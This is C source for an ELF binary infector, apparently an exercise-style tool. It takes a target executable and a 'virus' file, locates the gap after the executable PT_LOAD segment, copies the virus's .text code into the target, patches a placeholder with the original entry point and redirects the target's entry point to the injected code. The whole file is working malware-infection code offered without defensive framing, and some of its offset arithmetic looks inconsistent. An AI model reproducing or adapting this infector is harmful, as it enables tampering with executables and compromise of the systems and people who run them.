#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>
#include <elf.h>

typedef struct		s_file
{
	int				fd;
	void			*map;
	off_t			size;
	Elf64_Addr		e_entry;
	Elf64_Addr		p_vaddr;
	Elf64_Off		sh_offset;
	uint64_t		sh_size;
}					t_file;

void	munmap_file(t_file *file)
{
	if (file->fd > 0)
	{
		munmap(file->map, file->size);
		close(file->fd);
	}
}

int		mmap_file(const char *name, t_file *file)
{
	struct stat		fst;

	file->fd = open(name, O_RDWR);
	if (file->fd < 0)
	{
		printf("Error: open failed\n");
		return (-1);
	}
	printf("[*] File %s opened\n", name);

	if (fstat(file->fd, &fst) == -1)
	{
		printf("Error: fstat failed\n");
		close(file->fd);
		return (-1);
	}
	file->size = fst.st_size;
	printf("[*] File %s size is %ld bytes\n", name, file->size);

	file->map = mmap(NULL, file->size, PROT_READ|PROT_WRITE, MAP_SHARED, file->fd, 0);
	if (file->map == MAP_FAILED)
	{
		printf("Error: mmap failed\n");
		close(file->fd);
		return (-1);
	}
	printf("[*] File mmaped\n");
	return (0);
}

int		check_load_segment(t_file *target, t_file *virus)
{
	Elf64_Ehdr		*ehdr;
	Elf64_Phdr		*curr_phdr;
	Elf64_Phdr		*next_phdr;
	uint16_t		phnum;

	ehdr = (Elf64_Ehdr *)(target->map);
	phnum = 0;
	while (phnum < ehdr->e_phnum)
	{
		curr_phdr = (Elf64_Phdr *)(target->map + ehdr->e_phoff + (phnum * sizeof(Elf64_Phdr)));
		if (curr_phdr->p_type == PT_LOAD && curr_phdr->p_flags & PF_X)
		{
			if ((phnum + 1) < ehdr->e_phnum)
			{
				next_phdr = (Elf64_Phdr *)(target->map + ehdr->e_phoff + ((phnum + 1) * sizeof(Elf64_Phdr)));
				if (next_phdr->p_type == PT_LOAD)
				{
					printf("[*] PT_LOAD (data) is at offset %lu (%lu bytes)\n", next_phdr->p_offset, next_phdr->p_filesz);
					printf("[*] Free space between PT_LOAD (text) and PT_LOAD (data) is %lu bytes\n", next_phdr->p_offset - (curr_phdr->p_offset + curr_phdr->p_filesz));
					if (next_phdr->p_offset - (curr_phdr->p_offset + curr_phdr->p_filesz) > virus->sh_size)
					{
						printf("[*] Depacker can be injected at offset %lu\n", curr_phdr->p_offset + curr_phdr->p_filesz);
						return (0);
					}
					printf("[e] Error: Not enough space between PT_LOADs to inject code\n");
					return (-1);
				}
			}
		}
		phnum += 1;
	}
	printf("[e] Error: Not enough space between PT_LOADs to inject code\n");
	return (-1);
}

int		update_asm_addr(void *m, size_t len, uint64_t pat, uint64_t val)
{
	unsigned char	*p;
	uint64_t		n;
	size_t			i;

	p = (unsigned char *)m;
	i = 0;
	while (i < (len - 7))
	{
		n = *((uint64_t *)(p + i));
		if (n == pat)
		{
			*((uint64_t *)(p + i)) = val;
		}
		i++;
	}
	return (0);
}

int		infect_load_segment(t_file *target, t_file *virus)
{
	Elf64_Ehdr		*ehdr;
	Elf64_Phdr		*phdr;
	uint16_t		phnum;
	int				after;

	after = 0;

	ehdr = (Elf64_Ehdr *)(target->map);
	phnum = 0;
	while (phnum < ehdr->e_phnum)
	{
		phdr = (Elf64_Phdr *)(target->map + ehdr->e_phoff + (phnum * sizeof(Elf64_Phdr)));
		if (after != 0)
		{
			phdr->p_offset += 0x200000;
		}
		else if (phdr->p_type == PT_LOAD && phdr->p_flags & PF_X)
		{
			printf("[*] Virtual base address is 0x%lx\n", phdr->p_vaddr);

			memcpy(target->map + phdr->p_offset + phdr->p_filesz, virus->map + virus->sh_offset, virus->sh_size);
			printf("[*] Virus code injected as offset %lu\n", phdr->p_offset + phdr->p_filesz);

			phdr->p_filesz += virus->sh_size;
			phdr->p_memsz += virus->sh_size;
			printf("[*] Segment filesz / memsz updated to %lu / %lu\n", phdr->p_filesz, phdr->p_memsz);

			update_asm_addr(target->map + phdr->p_offset + phdr->p_filesz, virus->sh_size, 0x1111111111111111, ehdr->e_entry);
			printf("[*] Return address updated to 0x%lx\n", ehdr->e_entry);
			
			ehdr->e_entry = phdr->p_vaddr + phdr->p_filesz;
			printf("[*] Entry point updated to 0x%lx\n", ehdr->e_entry);

			after += 1;
		}
		phnum += 1;
	}
	return (0);
}

int		find_text_section(t_file *file)
{
	Elf64_Ehdr		*ehdr;
	Elf64_Shdr		*shdr;
	Elf64_Shdr		stable;
	char			*sname;
	int				shnum;

	ehdr = (Elf64_Ehdr *)(file->map);
	shdr = (Elf64_Shdr *)(file->map + ehdr->e_shoff);
	stable = shdr[ehdr->e_shstrndx];
	sname = (char *)(file->map + stable.sh_offset);
	shnum = 0;
	while (shnum < ehdr->e_shnum)
	{
		stable = shdr[shnum];
		if (!strcmp(sname + stable.sh_name, ".text"))
		{
			file->sh_offset = shdr[shnum].sh_offset;
			file->sh_size = shdr[shnum].sh_size;
			return (0);
		}
		shnum += 1;
	}
	return (-1);
}

int		update_sections_offset(t_file *file)
{
	Elf64_Ehdr		*ehdr;
	Elf64_Shdr		*shdr;
	Elf64_Shdr		stable;
	char			*sname;
	int				shnum;

	ehdr = (Elf64_Ehdr *)(file->map);
	shdr = (Elf64_Shdr *)(file->map + ehdr->e_shoff);
	stable = shdr[ehdr->e_shstrndx];
	sname = (char *)(file->map + stable.sh_offset);
	shnum = 0;
	while (shnum < ehdr->e_shnum)
	{
		if (shdr[shnum].sh_offset >= ehdr->e_entry)
		{
			shdr[shnum].sh_offset += 0x200000;
			printf("[*] %s section offset updated to %lu\n", sname + stable.sh_name, shdr[shnum].sh_offset);
		}
		shnum += 1;
	}
	return (0);
}

int		main(int ac, char **av)
{
	t_file			target;
	t_file			virus;
	Elf64_Ehdr		*ehdr;

	// Check program arguments count
	if (ac != 3)
	{
		printf("Usage: ./%s <target> <virus>\n", av[0]);
		return (1);
	}

	// Mmap target and virus files
	if (mmap_file(av[1], &target) == -1 || mmap_file(av[2], &virus) == -1)
	{
		munmap_file(&target);
		munmap_file(&virus);
		return (-1);
	}

	if (find_text_section(&target) != -1)
		printf("[*] .text section of %s found at offset %lu (%lu bytes)\n", av[1], target.sh_offset, target.sh_size);

	if (find_text_section(&virus) != -1)
		printf("[*] .text section of %s found at offset %lu (%lu bytes)\n", av[2], virus.sh_offset, virus.sh_size);

	if (check_load_segment(&target, &virus) != -1)
	{
		((Elf64_Ehdr *)(target.map))->e_shoff += 0x200000;
		printf("[*] Section header offset update to %lu\n", (Elf64_Ehdr *)(target.map)->e_shoff);
		
		infect_load_segment(&target, &virus);
		update_sections_offset(&target);
	}

	// Release files
	munmap_file(&target);
	munmap_file(&virus);
	return (0);
}
